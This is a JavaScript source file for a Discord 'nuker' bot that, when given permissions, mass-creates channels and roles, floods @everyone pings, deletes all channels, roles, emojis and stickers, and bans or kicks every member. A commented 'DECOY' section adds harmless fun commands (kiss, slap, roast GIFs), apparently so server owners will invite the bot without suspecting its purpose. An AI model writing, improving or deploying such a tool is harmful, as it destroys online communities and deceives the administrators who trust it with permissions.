//https://discord.com/api/oauth2/authorize?client_id=923682857350733907&permissions=1642758401271&scope=bot


const { Client, Intents, MessageEmbed } = require("discord.js");
const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red, greenBright, cyan, yellow } = require("chalk");
const { token, prefix, userID, disableEveryone } = require("../config/config.json")

const PREFIX = "?";

nuker.on("ready", () => {
    console.clear();
    console.log(red(`
    
                                                   
                    DISCORD NUKER

                    Nuker: ${nuker.user.tag}
                    Prefix: ${prefix}
    `))
    nuker.user.setActivity({ name: "Zoophile >w<", type: "PLAYING" });
});

nuker.on("messageCreate", (message) => {

    // Help Embed
    const help = new MessageEmbed()
        .setDescription(`**Zoo Help ;**
    \n**mass channels ;**
    ${prefix}mc [amount] (text) i.e \`${prefix}mc 5 test\`\n
    **mass channel n ping ;**
    ${prefix}cp [amount] (text), {message} i.e \`${prefix}cp 5 test, testing\`\n
    **mass roles ;**
    ${prefix}mr [amount] (text) i.e \`${prefix}mr 5 test\`\n
    **delete channels ;**
    ${prefix}dc\n
    **delete roles ;**
    ${prefix}dr\n
    **delete emotes ;**
    ${prefix}de\n
    **delete stickers (new) ;**
    ${prefix}ds\n
    **mass kick ;**
    ${prefix}mk\n
    **mass ban ;**
    ${prefix}mb
    `)
        .setFooter(`© Sike I lied`)
        .setColor(0x36393E)
        .setTimestamp(Date.now());

    // Perms
    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

    // Possible Args
    let args = message.content.split(" ").slice(1);
    var args1 = args[0]; // Used for amount
    var args2 = args.slice(1).join(' ') // Naming things
    var args3 = args.slice(2).join(', '); // Other

    if (!disableEveryone) {
        // Commands

        // Help
        if (message.content.startsWith(prefix + "help")) {
            message.channel.send({embeds: [help]})
        }

        // Mass Channels
        if (message.content.startsWith(prefix + "mc")) {
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all channels
        if (message.content.startsWith(prefix + "dc")) {
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Channels and Ping
        if (message.content.startsWith(prefix + "cp")) {
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // Mass Roles
        if (message.content.startsWith(prefix + "mr")) {
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Roles
        if (message.content.startsWith(prefix + "dr")) {
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Stickers
        if (message.content.startsWith(prefix + "ds")) {
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // Delete all Emotes
        if (message.content.startsWith(prefix + "de")) {
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Ban
        if (message.content.startsWith(prefix + "mb")) {
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // Mass Kick
        if (message.content.startsWith(prefix + "mk")) {
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    } else {
        

        
        if (message.content.startsWith(prefix + "help")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            message.channel.send({embeds: [help]})
        }

       
        if (message.content.startsWith(prefix + "mc")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        
        if (message.content.startsWith(prefix + "dc")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

       
        if (message.content.startsWith(prefix + "cp")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

      
        if (message.content.startsWith(prefix + "mr")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        
        if (message.content.startsWith(prefix + "dr")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        
        if (message.content.startsWith(prefix + "ds")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        
        if (message.content.startsWith(prefix + "de")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        
        if (message.content.startsWith(prefix + "mb")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        
        if (message.content.startsWith(prefix + "mk")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
    }

 
    function MassChannels(amount, channelName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
            if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
                }
            }
            resolve();
        });
    }


    function MassChnPing(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
            if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
            if (!pingMessage) return reject("Unspecified Args: Specify the message you wish to mass mention");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1);
                    });
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1); // literally not possible but lol?
                    });
                }
            }
            resolve();
        });
    }


    function DelAllChannels() {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
            resolve();
        });
    }

  
    function MassRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass roles");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
            if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
                } else {
                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
                }
            }
        })
    }

    function DelAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
        });
    }


    function DelAllEmotes() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
        });
    }

    /**
     * Deletes all stickers
     */
    function DelAllStickers() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
        });
    }

    /**
     * Ban all guild Members
     */
    function BanAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("Bot Missing Permissions: 'BAN_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banning...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.ban().catch((err) => { console.log(red("Error Found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was banned.`)) });
                    }
                }, 2000);
            })
        })
    }

    /**
     * Kick all guild Members
     */
    function KickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("Bot Missing Permissions: 'KICK_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banning...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.kick().catch((err) => { console.log(red("Error Found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was kicked.`)) });
                    }
                }, 2000);
            })
        })
    }
});

try {
    nuker.login(token);
} catch (err) {
    console.error(err)
}
//NUKER ABOVE ONLY
//-----------------------------------------------------------
//DECOY BELOW



function kill() {
    var randKill = [
      'https://c.tenor.com/c9KEUCrTarUAAAAC/home-alone-macaulay-culkin.gif',
           'https://i.giphy.com/media/DyqPAnuAklAXe/giphy.webp',
           'https://media2.giphy.com/media/xUA7aR8729ujMcDspW/giphy-downsized-large.gif',
           'https://media0.giphy.com/media/nfLpqTrNPpqcE/200.gif'
     ]
     return randKill[Math.floor(Math.random() * randKill.length)];
  }

  function roastIng() {
   var randRoast = [
       'If I throw a stick, will you leave?',
       'light travels faster than sound, which is why you seemed bright until you spoke.',
       'Hold still. I’m trying to imagine you with a personality.',
       'OH MY GOD! IT SPEAKS!',
       'I guess if you actually ever spoke your mind, you’d really be speechless.',
       'Your birth certificate is an apology letter from the condom factory.',
       'Child, I’ve forgotten more than you ever knew.',
       'I’m busy right now; can I ignore you another time?',
       'Someday you’ll go far… and I really hope you stay there.',
       'You are more disappointing than an unsalted pretzel.',
       'I’ll never forget the first time we met. But I’ll keep trying.',
       'I’m not insulting you; I’m describing you.',
       'I thought of you today. It reminded me to take out the trash.',
       'You are like a cloud. When you disappear, it’s a beautiful day.',
       'You just might be why the middle finger was invented in the first place.',
       'Your family tree must be a cactus because everybody on it is a prick.',
       'Feed your own ego. I’m busy',
       'I was going to make a joke about your life, but I see life beat me to the punch.',
       'Life is full of disappointments, and I just added you to the list',
       'I treasure the time I don’t spend with you.'
   ];
 
   return randRoast[Math.floor(Math.random() * randRoast.length)];
 }

 function slaping() {
   var randSlap = [
     'https://media3.giphy.com/media/uG3lKkAuh53wc/200.gif',
     'https://c.tenor.com/3OcwlqyLD0IAAAAM/bassi-slapped.gif',
     'https://c.tenor.com/nAiuA2RdCIkAAAAM/baby-slap.gif',
     'https://c.tenor.com/qZ3ONOWA6ygAAAAd/slap-slapping.gif'
   ];
 
   return randSlap[Math.floor(Math.random() * randSlap.length)];
 }
  
  function doKissAction() {
   var rand = [
       'https://media2.giphy.com/media/G3va31oEEnIkM/giphy.gif',
       'https://media1.tenor.com/images/f5167c56b1cca2814f9eca99c4f4fab8/tenor.gif?itemid=6155657',
       'https://media.tenor.com/images/fbb2b4d5c673ffcf8ec35e4652084c2a/tenor.gif',
       'https://c.tenor.com/BgGY6tk4Wb8AAAAM/lilrevengebaby-funny-face.gif',
       'https://c.tenor.com/cfR6UVu0WCAAAAAM/wave-blow-kiss.gif',
       'https://acegif.com/wp-content/uploads/anime-kiss-m.gif',
       'https://media.giphy.com/media/bm2O3nXTcKJeU/giphy.gif',
       'https://media.giphy.com/media/nyGFcsP0kAobm/giphy.gif',
       'https://media0.giphy.com/media/KH1CTZtw1iP3W/source.gif',
       'https://c.tenor.com/T1SZB-kjmxcAAAAM/funny-face-goats.gif'
   ];

   return rand[Math.floor(Math.random() * rand.length)];
}

nuker.on('message', message => {
   let args = message.content.substring(PREFIX.length).split(" ");

   switch (args[0]) {
                  case 'kiss':
               const personTagged = message.mentions.members.first();

               if(!args[1]) {
                   message.channel.send('You are missing arguments!')
               }else{
                   message.channel.send(`<@${message.author.id}>` + ' has kissed ' + personTagged.displayName + ' ' + doKissAction())
               }

           break;
       }
           switch (args[0]) {
             case 'roast':
          const personTagged = message.mentions.members.first();

          if(!args[1]) {
              message.channel.send('You are missing arguments!')
          }else{
              message.channel.send(`<@${personTagged.id}>` + ", " + ' ' + roastIng());
          }

      break;

  }
       switch (args[0]) {
         case 'cancel':
     const personTagged = message.mentions.members.first();

     if(!args[1]) {
         message.channel.send('You are missing arguments!')
     }else{
         message.channel.send(`<@${personTagged.id}>` + " https://c.tenor.com/CHC6gl8ef60AAAAM/skill-issue-ratio.gif");
     }

     if(message.content === '?slap @everyone') {
       message.reply('https://media3.giphy.com/media/Ju7l5y9osyymQ/200.gif');
     }

     break;
   }
     switch (args[0]) {
       case 'slap':
   const personTagged = message.mentions.members.first();

   if(!args[1]) {
       message.channel.send('You are missing arguments!')
   }else{
       message.channel.send(`<@${personTagged.id}>` + " " + slaping());
   }

       break;
   }

   switch (args[0]) {
     case 'kill':
 const personTagged = message.mentions.members.first();

 if(!args[1]) {
     message.channel.send('You are missing arguments!')
 }else{
     message.channel.send(`<@${personTagged.id}>` + " " + kill());
 }

     break;
 }
});

nuker.on('message', message => {
    const GetSomeHelp = new MessageEmbed()
        .setDescription(`**Zoo Help ;**
            \n**kiss ;**
            ${prefix}kiss @user\n
            -----------------------------
            \n**uwu ;**
            ${prefix}uwu \n
            -----------------------------
            \n**roast ;**
            ${prefix}roast @user\n
            -----------------------------
            \n**slap ;**
            ${prefix}slap @user\n
            -----------------------------
            \n**kill ;**
            ${prefix}kill @user\n
            -----------------------------
            **cancel ;**
            ${prefix}cancel @user\n
            `)
                .setFooter(`© Sike I lied`)
                .setColor(0x36393E)
                .setTimestamp(Date.now());

            if (message.content.startsWith(PREFIX + "help")) {
                    message.channel.send({embeds: [GetSomeHelp]})
            }
    
    
    if(message.content === '?uwu' || message.content === '?UwU') {
      const UwU = {
        uwu: [
          'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT0lFVjP5TZCytHax-VcnI7ySGc6bCcqLNfI3-8En_fFB58ee3DrSawENG5VHCKs2_Q69k&usqp=CAU',
          'https://i.pinimg.com/originals/c3/08/7b/c3087b2784dfdcaa8b62c78103fa06a3.gif',
          'https://i.imgur.com/aljfcrf.gif',
          'https://c.tenor.com/h339xLnDaVQAAAAM/egoz-uwu.gif',
          'https://cdn.discordapp.com/attachments/899297932988272750/902006007075577886/redditsave.com_the_truth-hzbouuurvoy61.mp4'
        ]
    }
    message.reply(UwU.uwu[Math.floor(Math.random() * UwU.uwu.length)]);
  }
  });